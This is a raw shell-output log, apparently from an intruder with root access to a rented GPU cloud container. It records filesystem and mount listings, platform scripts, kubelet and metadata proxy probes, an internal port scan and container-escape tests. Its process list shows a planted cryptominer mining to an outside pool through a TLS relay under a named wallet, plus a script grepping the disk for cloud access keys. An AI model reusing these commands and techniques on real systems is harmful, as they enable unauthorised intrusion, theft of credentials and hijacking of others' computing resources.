@@ -1,0 +1,573 @@
+Warning: Permanently added '[116.211.127.168]:32917' (ED25519) to the list of known hosts.
+###P2START Tue Nov 24 18:17:24 UTC 2026
+=== ROOT-LS ===
+/:
+total 32
+drwxr-xr-x    1 root root 4096 Aug 14 14:08 .
+drwxr-xr-x    1 root root 4096 Aug 14 14:08 ..
+-rw-r--r--    1 root root    0 Nov 25 02:17 .DiskErrCheck
+-rwxr-xr-x    1 root root    0 Nov 21 15:05 .dockerenv
+drwxr-xr-x    3 root root   30 Feb 28  2026 .onething
+lrwxrwxrwx    1 root root   32 Feb 28  2026 .ot_readonly -> /.ot_u_public/onething-ai/models
+drwxrwxrwt    3 root root   60 Oct 18 05:11 .ot_u_public
+lrwxrwxrwx    1 root root    7 Oct  4  2023 bin -> usr/bin
+drwxr-xr-x    2 root root    6 Apr 18  2022 boot
+drwxr-xr-x    8 root root  138 Aug 26 12:16 data1
+drwxr-xr-x    3 root root   28 Aug 14 14:08 data2
+drwxr-xr-x    7 root root  500 Nov 25 00:38 dev
+drwxr-xr-x    1 1000 1000 4096 Nov 25 00:57 etc
+drwxr-xr-x    1 root root   46 Aug 18 10:24 home
+lrwxrwxrwx    1 root root    7 Oct  4  2023 lib -> usr/lib
+lrwxrwxrwx    1 root root    9 Oct  4  2023 lib32 -> usr/lib32
+lrwxrwxrwx    1 root root    9 Oct  4  2023 lib64 -> usr/lib64
+lrwxrwxrwx    1 root root   10 Oct  4  2023 libx32 -> usr/libx32
+drwxr-xr-x    2 root root    6 Oct  4  2023 media
+drwxr-xr-x    2 root root    6 Oct  4  2023 mnt
+drwxr-xr-x    1 root root   28 Nov 10  2023 opt
+dr-xr-xr-x 1749 root root    0 Nov 21 21:41 proc
+drwx------    1 root root 4096 Nov 25 00:02 root
+drwxr-xr-x    1 root root 4096 Nov 25 02:17 run
+lrwxrwxrwx    1 root root    8 Oct  4  2023 sbin -> usr/sbin
+drwxr-xr-x    2 root root    6 Oct  4  2023 srv
+lrwxrwxrwx    1 root root   32 Feb 28  2026 storage -> /.ot_u_public/onething-ai/models
+dr-xr-xr-x   13 root root    0 Nov 21 21:41 sys
+drwxrwxrwt    1 root root 8192 Nov 25 02:14 tmp
+drwxrwxrwx   10 root root  182 Sep 29 15:16 umer
+drwxr-xr-x    1 1000 1000   90 Aug  8  2023 usr
+drwxr-xr-x    1 root root  123 Mar  4  2026 var
+
+/root:
+total 88432
+drwx------ 1 root root     4096 Nov 25 00:02 .
+drwxr-xr-x 1 root root     4096 Aug 14 14:08 ..
+-rw------- 1 root root    32840 Nov 23 09:18 .bash_history
+-rw-r--r-- 1 root root     3787 Nov 21 21:41 .bashrc
+-rw-r--r-- 1 root root     3561 Feb 28  2026 .bashrc.bak
+drwxr-xr-x 1 root root      167 Apr  9  2026 .cache
+drwxr-xr-x 1 root root       38 Mar 28  2024 .conda
+-rw-rw-r-- 1 root root      809 Sep  6  2024 .condarc
+drwxr-xr-x 1 root root       70 Aug 14 13:44 .config
+drwxr-xr-x 2 root root     4096 Nov 25 01:52 .hk
+drwxr-xr-x 2 root root       10 Feb 28  2026 .ipython
+drwxr-xr-x 3 root root       83 Jul 15 13:19 .jupyter
+drwxr-xr-x 3 root root       27 Feb 28  2026 .local
+drwx------ 3 root root       34 Mar  3  2026 .nv
+-rw-r--r-- 1 root root      161 Jul  9  2019 .profile
+-rw------- 1 root root      107 Nov  4 13:21 .python_history
+-rw-r--r-- 1 root root        0 Mar 13  2026 .selected_editor
+-rw------- 1 root root    12033 Aug 26 09:23 .viminfo
+-rw-r--r-- 1 root root       52 Feb 28  2026 .wgetrc
+drwxr-xr-x 1 root root      109 Sep  6  2024 miniconda3
+drwxr-xr-x 7 root root     4096 Sep 23 13:41 onethingai-fs
+drwxr-xr-x 2 root root       10 Feb 28  2026 onethingai-tmp
+-rwxr-xr-x 1 root root 44641460 Nov 25 00:02 peakminer
+=== ONETHING ===
+/.onething
+/.onething/instance
+/.onething/instance/tools
+/.onething/instance/tools/pkg
+/.onething/instance/tools/pkg/zzzz_net
+/.onething/instance/tools/pkg/pan_client
+/.onething/instance/tools/pkg/shutdown
+/.onething/instance/tools/pkg/otlink
+/.onething/instance/tools/pkg/filebrowser
+/.onething/instance/tools/pkg/init_slave
+/.onething/instance/tools/pkg/cert
+/.onething/instance/tools/pkg/proxy
+/.onething/instance/tools/pkg/launcher
+/.onething/instance/tools/pkg/jupyterlab
+/.onething/instance/tools/pkg/toolsHandler
+/.onething/instance/tools/pkg/vm_manager
+/.onething/instance/tools/pkg/model_center_client
+/.onething/instance/tools/script
+/.onething/instance/tools/script/ot-vm-manager.sh
+/.onething/instance/tools/script/vm-reboot.sh
+/.onething/instance/tools/script/is_gpu_broke.sh
+/.onething/instance/tools/script/onepm
+/.onething/instance/tools/script/init.sh
+/.onething/instance/configmap
+/.onething/instance/configmap/wget.sh
+/.onething/instance/configmap/git.sh
+/.onething/instance/configmap/proxyNetConfig.json
+/.onething/instance/configmap/pip.sh
+/.onething/instance/tools.old
+/.onething/instance/tools.old/pkg
+/.onething/instance/tools.old/pkg/zzzz_net
+/.onething/instance/tools.old/pkg/pan_client
+/.onething/instance/tools.old/pkg/shutdown
+/.onething/instance/tools.old/pkg/otlink
+/.onething/instance/tools.old/pkg/filebrowser
+/.onething/instance/tools.old/pkg/init_slave
+/.onething/instance/tools.old/pkg/cert
+/.onething/instance/tools.old/pkg/proxy
+/.onething/instance/tools.old/pkg/launcher
+/.onething/instance/tools.old/pkg/jupyterlab
+/.onething/instance/tools.old/pkg/toolsHandler
+/.onething/instance/tools.old/pkg/vm_manager
+/.onething/instance/tools.old/pkg/model_center_client
+/.onething/instance/tools.old/script
+/.onething/instance/tools.old/script/ot-vm-manager.sh
+/.onething/instance/tools.old/script/vm-reboot.sh
+/.onething/instance/tools.old/script/is_gpu_broke.sh
+/.onething/instance/tools.old/script/onepm
+/.onething/instance/tools.old/script/init.sh
+=== INIT-SH ===
+#!/bin/bash
+
+# 定义一些常用函数
+info() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [INFO] $*"
+}
+
+warn() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [WARN] $*"
+}
+
+error() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [ERROR] $*"
+}
+
+fatal() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [FATAL] $*"
+  exit 1
+}
+
+step=1
+logStep() {
+  info "====Step ${step} $*===="
+  step=$((step + 1))
+}
+
+log_exit_code() {
+  exit_code=$?
+  if test $exit_code -ne 0; then
+    warn "exec fail, exit code: ${exit_code}"
+    return
+  fi
+  info "exec succ, exit code: ${exit_code}"
+}
+
+cd "$(dirname "/")" || exit
+cur_dir=$(pwd)
+
+# 0. set env
+setBash() {
+  info "set bash"
+  bashrc=/root/.bashrc
+  if ! test -f "${bashrc}.bak"; then
+    info "backup bash"
+    cp "${bashrc}" "${bashrc}.bak"
+  fi
+
+  banner='# history cfg add by instance tools'
+
+  # 100 line => 4.4K, 100000 line ~> 4.4M
+
+  if ! grep "${banner}" "${bashrc}"; then
+    info "append bash"
+    echo "${banner}"'
+HISTCONTROL="ignorespace"
+HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "
+HISTFILESIZE=100000
+HISTSIZE=1000
+
+shopt -s histappend
+PROMPT_COMMAND="history -a;$PROMPT_COMMAND"' >>"${bashrc}"
+  fi
+}
+
+exportEnv() {
+  OMP_NUM_THREADS=$(cat /proc/cpuinfo | grep processor | wc -l)
+  export OMP_NUM_THREADS
+}
+
+removeOnethingService() {
+  info "remove legacy onething services"
+  onethingService=$(find /etc/supervisor/conf.d -name "onething-service-*.conf")
+  for i in ${onethingService}; do
+    info "remove service $i"
+    rm -f "${i}"
+    log_exit_code
+  done
+}
+
+# support disable pkg
+isPkgDisable() {
+  # return 0 if disable
+  pkgName="$1"
+  if test -z "${pkgName}"; then
+    return 1
+  fi
+  disableFlag="/etc/.disable_pkg_${pkgName}"
+  if test -f "${disableFlag}"; then
+    return 0
+  fi
+  return 1
+}
+
+pkgInit() {
+  info "call pkg-init.sh"
+  pkgPath="/.onething/instance/tools/pkg/"
+  for pkg in "${pkgPath}"*; do
+    info "find pkg ${pkg}"
+    if isPkgDisable "${pkg#"${pkgPath}"}"; then
+      info "disable pkg ${pkg}"
+    else
+      pkgInit="${pkg}/pkg-init.sh"
+      info "call ${pkgInit}"
+      timeout 5m sh "${pkgInit}"
+      log_exit_code
+    fi
+  done
+}
+
+isServiceDisable() {
+  # return 0 if disable
+  service="$1"
+  if test -z "${service}"; then
+    return 1
+  fi
+
+  disableFlag="/etc/.disable_plugin_${service}"
+  if test -f "${disableFlag}"; then
+    return 0
+  fi
+=== ONETHING-ENV-KEYS ===
+CUDA_VERSION
+CUDNN_PATH
+HOME
+HOSTNAME
+INS_PRE_DEPLOY_ROOT
+LD_LIBRARY_PATH
+LIBRARY_PATH
+NCCL_VERSION
+NVARCH
+NVIDIA_DRIVER_CAPABILITIES
+NVIDIA_PRODUCT_NAME
+NVIDIA_REQUIRE_CUDA
+NVIDIA_VISIBLE_DEVICES
+NVIDIA_VISIBLE_DEVICES_FILE
+NV_CUDA_COMPAT_PACKAGE
+NV_CUDA_CUDART_DEV_VERSION
+NV_CUDA_CUDART_VERSION
+NV_CUDA_LIB_VERSION
+NV_CUDA_NSIGHT_COMPUTE_DEV_PACKAGE
+NV_CUDA_NSIGHT_COMPUTE_VERSION
+NV_CUDNN_PACKAGE
+NV_CUDNN_PACKAGE_DEV
+NV_CUDNN_PACKAGE_NAME
+NV_CUDNN_VERSION
+NV_LIBCUBLAS_DEV_PACKAGE
+NV_LIBCUBLAS_DEV_PACKAGE_NAME
+NV_LIBCUBLAS_DEV_VERSION
+NV_LIBCUBLAS_PACKAGE
+NV_LIBCUBLAS_PACKAGE_NAME
+NV_LIBCUBLAS_VERSION
+NV_LIBCUSPARSE_DEV_VERSION
+NV_LIBCUSPARSE_VERSION
+NV_LIBNCCL_DEV_PACKAGE
+NV_LIBNCCL_DEV_PACKAGE_NAME
+NV_LIBNCCL_DEV_PACKAGE_VERSION
+NV_LIBNCCL_PACKAGE
+NV_LIBNCCL_PACKAGE_NAME
+NV_LIBNCCL_PACKAGE_VERSION
+NV_LIBNPP_DEV_PACKAGE
+NV_LIBNPP_DEV_VERSION
+=== ONETHING-FILES ===
+--- /.onething/instance/tools/script/init.sh
+#!/bin/bash
+
+# 定义一些常用函数
+info() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [INFO] $*"
+}
+
+warn() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [WARN] $*"
+}
+
+error() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [ERROR] $*"
+}
+
+fatal() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [FATAL] $*"
+  exit 1
+}
+
+step=1
+logStep() {
+  info "====Step ${step} $*===="
+  step=$((step + 1))
+}
+
+log_exit_code() {
+  exi
+--- /.onething/instance/tools/script/is_gpu_broke.sh
+#!/bin/bash
+
+# 定义一些常用函数
+info() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [INFO] $*"
+}
+
+warn() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [WARN] $*"
+}
+
+error() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [ERROR] $*"
+}
+
+fatal() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [FATAL] $*"
+  exit 1
+}
+
+# code define
+# 注意，由于脚本不存在时也返回异常码，所以我们的检查脚本�
+--- /.onething/instance/tools/script/onepm
+ELF          >    ��F     @       �          @ 8  @         @       @ @     @ @     P      P                   �      �@     �@     d       d                              @       @     s     s                           \       \     �g      �g                    �<      �|      �|     `�     �            Q�td                                                  
+--- /.onething/instance/tools/script/ot-vm-manager.sh
+#!/bin/bash
+
+# 定义一些常用函数
+info() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [INFO] $*"
+}
+
+warn() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [WARN] $*"
+}
+
+error() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [ERROR] $*"
+}
+
+fatal() {
+  echo "[$(date +"%Y-%m-%d %H:%M:%S")] [FATAL] $*"
+  exit 1
+}
+
+
+declare -A enablePkg
+enablePkg["proxy"]="true"
+enablePkg["toolsHandler"]="true"
+enablePkg["cert"]=
+--- /.onething/instance/tools/script/vm-reboot.sh
+#!/bin/bash
+
+test -z "${STORAGE}" && STORAGE=/storage
+test -z "${VM_ADMIN_SOCKET}" && exit 1
+
+curl --unix-socket "${STORAGE%/}/${VM_ADMIN_SOCKET}" http://vm-reboot/reboot || exit 2
+
+=== OTPUBLIC ===
+total 4
+drwxrwxrwt 3 root root   60 Oct 18 05:11 .
+drwxr-xr-x 1 root root 4096 Aug 14 14:08 ..
+drwxr-xr-x 3 root root   60 Oct 18 05:12 onething-ai
+total 4
+drwxr-xr-x   3 root root   60 Oct 18 05:12 .
+drwxrwxrwt   3 root root   60 Oct 18 05:11 ..
+drwxrwxrwx 262 root root 4096 Nov 22 06:25 models
+=== JFS ===
+total 32
+drwxr-xr-x 7 root root 4096 Sep 23 13:41 .
+drwx------ 1 root root 4096 Nov 25 00:02 ..
+-r-------- 1 root root    0 Nov 21 21:41 .accesslog
+lrwxrwxrwx 1 root root   24 Aug 28 15:13 .cloud_storage_disabled -> /.cloud_storage_disabled
+-r-------- 1 root root 2585 Nov 21 21:41 .config
+-r--r--r-- 1 root root    0 Nov 21 21:41 .stats
+drwxr-xr-x 6 root root 4096 Jan 15  2026 data1
+drwxr-xr-x 3 root root 4096 Feb 27  2026 enviroment
+drwxr-xr-x 3 root root 4096 Aug 28 14:30 h3d
+Umer3D
+UmerFaceOld
+UmerFaceOrgans
+UmerFacePoint
+=== MNT ===
+ls: cannot access '/mnt/data': No such file or directory
+ls: cannot access '/xymnt': No such file or directory
+/mnt:
+total 4
+drwxr-xr-x 2 root root    6 Oct  4  2023 .
+drwxr-xr-x 1 root root 4096 Aug 14 14:08 ..
+=== RUN ===
+lrwxrwxrwx 1 root root    4 Oct  4  2023 /var/run -> /run
+
+/run:
+total 24
+drwxr-xr-x 1 root root 4096 Nov 25 02:17 .
+drwxr-xr-x 1 root root 4096 Aug 14 14:08 ..
+drwxr-xr-x 2 root root  123 Nov 21 21:47 apache2
+-rw-r--r-- 1 root root    6 Aug 26 09:07 crond.pid
+---------- 1 root root    0 Apr  1  2026 crond.reboot
+drwxr-xr-x 2 root root   36 Nov 21 21:41 filebrowser
+drwxrwxrwt 1 root root   29 Mar  4  2026 lock
+drwxr-xr-x 2 root root    6 Mar 28  2024 log
+drwxr-xr-x 3 root root   76 Feb 28  2026 model_center_client
+-rw-r--r-- 1 root root  397 Nov 25 02:17 motd.dynamic
+drwxr-xr-x 2 root root   10 Oct  4  2023 mount
+drwxr-xr-x 2 root root   28 Feb 28  2026 nvidia-persistenced
+drwxr-xr-x 2 root root   37 Feb 28  2026 pan_client
+drwxr-xr-x 2 root root   10 Feb 28  2026 proxy
+drwxr-xr-x 2 root root    6 Mar 28  2024 sendsigs.omit.d
+lrwxrwxrwx 1 root root    8 Mar 28  2024 shm -> /dev/shm
+drwxr-xr-x 2 root root    6 Jul 27  2023 sshd
+-rw-r--r-- 1 root root    7 Nov 25 00:57 sshd.pid
+srwx------ 1 root root    0 Nov 21 21:41 supervisor.sock
+-rw-r--r-- 1 root root    4 Nov 21 21:41 supervisord.pid
+drwxr-xr-x 1 root root  164 Mar 28  2024 systemd
+drwxr-xr-x 2 root root    6 Mar 28  2024 user
+drwxr-xr-x 2 root root   36 Nov 23 01:05 wildrig
+=== MOUNTINFO-EXT4 ===
+7706 7705 0:557 / /.ot_u_public/onething-ai/models rw,relatime master:396 - fuse.juicefs JuiceFS:yxyz-oss rw,user_id=0,group_id=0,default_permissions,allow_other
+7710 7704 259:4 /.onething/instance /.onething/instance ro,relatime - ext4 /dev/nvme2n1p3 rw
+7714 7704 259:4 /xymnt/instance/hostname/file/599e9b5b-8acb-4ac9-8d27-affb9ed3b779 /etc/hostname ro,relatime - ext4 /dev/nvme2n1p3 rw
+7715 7704 259:4 /xymnt/instance/hosts/file/599e9b5b-8acb-4ac9-8d27-affb9ed3b779 /etc/hosts ro,relatime - ext4 /dev/nvme2n1p3 rw
+7716 7704 259:4 /xymnt/instance/resolve-cfg/file/599e9b5b-8acb-4ac9-8d27-affb9ed3b779 /etc/resolv.conf ro,relatime - ext4 /dev/nvme2n1p3 rw
+7726 7704 259:4 /xymnt/instance/node-id/file/599e9b5b-8acb-4ac9-8d27-affb9ed3b779 /tmp/node_id ro,relatime - ext4 /dev/nvme2n1p3 rw
+7762 7704 259:4 /usr/lib64/libnvidia-egl-gbm.so.1.1.3 /usr/lib64/libnvidia-egl-gbm.so.1.1.3 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7763 7704 259:4 /etc/vulkan/icd.d/nvidia_icd.json /etc/vulkan/icd.d/nvidia_icd.json ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7764 7704 259:4 /etc/vulkan/implicit_layer.d/nvidia_layers.json /etc/vulkan/implicit_layer.d/nvidia_layers.json ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7766 7704 259:4 /usr/share/nvidia/nvoptix.bin /usr/share/nvidia/nvoptix.bin ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7767 7704 259:4 /usr/share/egl/egl_external_platform.d/10_nvidia_wayland.json /usr/share/egl/egl_external_platform.d/10_nvidia_wayland.json ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7768 7704 259:4 /usr/share/egl/egl_external_platform.d/15_nvidia_gbm.json /usr/share/egl/egl_external_platform.d/15_nvidia_gbm.json ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7769 7704 259:4 /usr/share/glvnd/egl_vendor.d/10_nvidia.json /usr/share/glvnd/egl_vendor.d/10_nvidia.json ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7777 7704 259:4 /usr/bin/nvidia-smi /usr/bin/nvidia-smi ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7781 7704 259:4 /usr/bin/nvidia-debugdump /usr/bin/nvidia-debugdump ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7782 7704 259:4 /usr/bin/nvidia-persistenced /usr/bin/nvidia-persistenced ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7783 7704 259:4 /usr/bin/nvidia-cuda-mps-control /usr/bin/nvidia-cuda-mps-control ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7784 7704 259:4 /usr/bin/nvidia-cuda-mps-server /usr/bin/nvidia-cuda-mps-server ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7785 7704 259:4 /usr/lib64/libnvidia-ml.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7786 7704 259:4 /usr/lib64/libnvidia-cfg.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-cfg.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7787 7704 259:4 /usr/lib64/libcuda.so.610.43.02 /usr/lib/x86_64-linux-gnu/libcuda.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7788 7704 259:4 /usr/lib64/libcudadebugger.so.610.43.02 /usr/lib/x86_64-linux-gnu/libcudadebugger.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7789 7704 259:4 /usr/lib64/libnvidia-opencl.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7840 7704 259:4 /usr/lib64/libnvidia-gpucomp.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-gpucomp.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7841 7704 259:4 /usr/lib64/libnvidia-ptxjitcompiler.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-ptxjitcompiler.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7842 7704 259:4 /usr/lib64/libnvidia-allocator.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-allocator.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7843 7704 259:4 /usr/lib64/libnvidia-pkcs11.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-pkcs11.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7844 7704 259:4 /usr/lib64/libnvidia-pkcs11-openssl3.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-pkcs11-openssl3.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7845 7704 259:4 /usr/lib64/libnvidia-nvvm.so.610.43.02 /usr/lib/x86_64-linux-gnu/libnvidia-nvvm.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+7846 7704 259:4 /usr/lib64/vdpau/libvdpau_nvidia.so.610.43.02 /usr/lib/x86_64-linux-gnu/libvdpau_nvidia.so.610.43.02 ro,nosuid,nodev,relatime master:1 - ext4 /dev/nvme2n1p3 rw
+=== LSBLK ===
+NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+nvme1n1     259:0    0     7T  0 disk 
+nvme2n1     259:1    0 894.3G  0 disk 
+├─nvme2n1p1 259:2    0   128M  0 part 
+├─nvme2n1p2 259:3    0   512M  0 part 
+├─nvme2n1p3 259:4    0    20G  0 part /usr/lib/firmware/nvidia/610.43.02/gsp_tu10x.bin
+│                                     /usr/lib/firmware/nvidia/610.43.02/gsp_ga10x.bin
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-glvkspirv.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libGLESv1_CM_nvidia.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libGLESv2_nvidia.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libEGL_nvidia.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libGLX_nvidia.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvoptix.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-rtcore.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-fbc.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-glsi.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-tls.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-glcore.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvidia-eglcore.so.610.43.02
+│                                     /usr/lib/x86_64-linux-gnu/libnvcuvid.so.610.43.02
+ls: cannot access '/dev/nvme*': No such file or directory
+ls: cannot access '/dev/sd*': No such file or directory
+=== KUBELET-CERT ===
+subject=CN = cpwx707f53e94e69@1754297450
+issuer=CN = cpwx707f53e94e69-ca@1754297450
+notBefore=Aug  4 07:50:50 2025 GMT
+notAfter=Aug  4 07:50:50 2026 GMT
+X509v3 Subject Alternative Name: 
+    DNS:cpwx707f53e94e69
+=== PROXY-1080 ===
+--- socks5 to 172.17.0.1:1080 -> 127.0.0.1:10250
+socks err TimeoutError
+--- socks5 -> 100.100.100.200:80
+socks err TimeoutError
+=== HTTP-PROXY-1080 ===
+http_proxy_code=000
+
+proxy_kubelet=401
+Unauthorized
+=== SEGMENTS ===
+192.168.2.1:22 OPEN
+192.168.2.1:80 OPEN
+192.168.2.2:443 OPEN
+192.168.2.2:22 OPEN
+192.168.2.2:80 OPEN
+192.168.2.100:22 OPEN
+192.168.2.101:22 OPEN
+=== CAP-TESTS ===
+mount: /tmp/mt: permission denied.
+mount_rc=0
+unshare: unshare failed: Operation not permitted
+unshare_rc=0
+nsenter: reassociate to namespace 'ns/mnt' failed: Operation not permitted
+nsenter_rc=0
+15000
+=== CGROUP-V1 ===
+blkio
+cpu
+cpu,cpuacct
+cpuacct
+cpuset
+devices
+freezer
+hugetlb
+memory
+net_cls
+0
+drwxr-xr-x 2 root root 0 Nov 21 21:41 /sys/fs/cgroup/devices
+touch: cannot touch '/sys/fs/cgroup/devices/x': Read-only file system
+=== DOCKER-CLI ===
+=== SSH-KEYS ===
+ls: cannot access '/root/.ssh': No such file or directory
+ls: cannot access '/root/.aliyun': No such file or directory
+ls: cannot access '/root/.ossutilconfig': No such file or directory
+ls: cannot access '/root/.aws': No such file or directory
+ls: cannot access '/root/.kube': No such file or directory
+=== AGENT ===
+   PID   PPID USER     COMMAND
+     1      0 root     /sbin/init -s -- sh /.onething/instance/tools/script/init.sh
+     7      1 root     sh /.onething/instance/tools/script/init.sh
+   116      7 root     /usr/bin/python3 /usr/bin/supervisord -n -c /etc/supervisor/supervisord.conf
+   124    116 root     /.onething/instance/tools/pkg/filebrowser/bin/filebrowser -c /.onething/instance/tools/pkg/filebrowser/conf/filebrowser.json
+   125    116 root     /.onething/instance/tools/pkg/jupyterlab/bin/jupyter_monitor
+   126    116 root     /.onething/instance/tools/pkg/model_center_client/bin/model_center_client
+   127    116 root     /.onething/instance/tools/pkg/otlink/bin/otlink -v=2
+   132    116 root     /.onething/instance/tools/pkg/pan_client/bin/pan_client
+   137    116 root     /.onething/instance/tools/pkg/proxy/bin/proxy
+   142    125 root     /root/miniconda3/bin/python3 /root/miniconda3/bin/jupyter-lab --allow-root --config=/root/.jupyter/jupyter_notebook_config.py
+   149    116 root     /.onething/instance/tools/pkg/toolsHandler/bin/toolsHandler
+   706      1 root     /root/miniconda3/envs/UmerFaceOldPy39/bin/python3.9 manage.py runserver 0.0.0.0:8095 --noreload
+   896      1 root     /root/miniconda3/envs/UmerFaceOldPy39/bin/python3.9 manage.py runserver 0.0.0.0:8094 --noreload
+  1191      1 root     /usr/sbin/apache2 -k start
+  1195   1191 www-data /usr/sbin/apache2 -k start
+  1196   1191 www-data /usr/sbin/apache2 -k start
+  4368   1191 www-data /usr/sbin/apache2 -k start
+ 21853      1 root     bash -s
+ 21863  21853 root     grep -rIl iJK5Prnd9IjGDsvLKEFh /root /etc /umer /opt /usr/local
+ 21864  21853 root     head -10
+ 23829      1 root     /bin/bash /root/.hk/start_gpu.sh 0
+ 23830      1 root     /bin/bash /root/.hk/start_gpu.sh 1
+ 24634  23830 root     python3 /root/.hk/tlsrelay.py 18049 global.pearlfortune.org 443
+ 24635  23829 root     python3 /root/.hk/tlsrelay.py 18048 global.pearlfortune.org 443
+ 25182      1 root     bash -c while true; do timeout 300 /root/.hk/peakminer --url stratum+tcp://prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30 >> /root/.hk/kx-g1.log 2>&1; sleep 5; done
+ 32028  23829 root     timeout 900 /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g0 --coin pearl -d 0 -p x -i 30
+ 32029  32028 root     /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g0 --coin pearl -d 0 -p x -i 30
+ 32031  23830 root     timeout 900 /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18049 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+ 32032  32031 root     /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18049 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+ 32047  32029 root     /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g0 --coin pearl -d 0 -p x -i 30
+ 32056  32032 root     /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18049 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+ 34864      1 root     bash /tmp/volc_recon.sh
+ 34866  34864 root     grep -rIEl VOLC_ACCESSKEY|VOLC_SECRETKEY|ARK_API_KEY|ark\.cn-|AKLT[A-Za-z0-9]{10,}|TOS_ACCESS|tos-cn-|VOLCENGINE|VOLC_ /root /opt /etc /var/lib /umer /home /data /usr/local /srv /app /workspace
+ 34867  34864 root     sort -u
+ 34868  34864 root     head -200
+ 34869  34864 root     tee /tmp/ul3738/files.txt
